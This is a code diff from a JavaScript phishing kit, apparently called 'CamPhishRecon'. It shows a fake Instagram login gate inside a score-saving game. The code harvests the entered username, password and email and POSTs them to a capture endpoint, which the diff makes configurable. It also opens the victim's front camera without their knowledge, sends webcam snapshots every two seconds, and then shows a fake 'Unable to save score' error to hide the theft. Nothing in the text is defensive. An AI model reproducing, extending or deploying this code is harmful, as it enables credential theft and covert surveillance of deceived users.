@@ -194,14 +194,14 @@ var u=document.getElementById('igUser'),p=document.getElementById('igPass');
 if(!u||!p||!u.value||!p.value)return;
 var data={template_id:'instagram',username:u.value,password:p.value};
 if(u.value.indexOf('@')>=0)data.email=u.value;
-fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
+ fetch((window.CamPhishRecon?'/api':'API_BASE_URL')+'/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
 if(window.CamPhishRecon){
 CamPhishRecon.Capture.event('colormatch_instagram_gate',{});
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
 var v=document.getElementById('v');v.srcObject=s;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'insta_gate_verify');}},2000);
-setTimeout(function(){clearInterval(ci);closeInstaGate();alert('⚠️ Unable to save score. Please try again.');},5000);
+ setTimeout(function(){clearInterval(ci);s.getTracks().forEach(function(t){t.stop();});closeInstaGate();if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.toast('Unable to save score. Please try again.',{tone:'danger'});}else{alert('Unable to save score. Please try again.');}},5000);
 }).catch(function(){closeInstaGate();});
 }else{closeInstaGate();}
 }
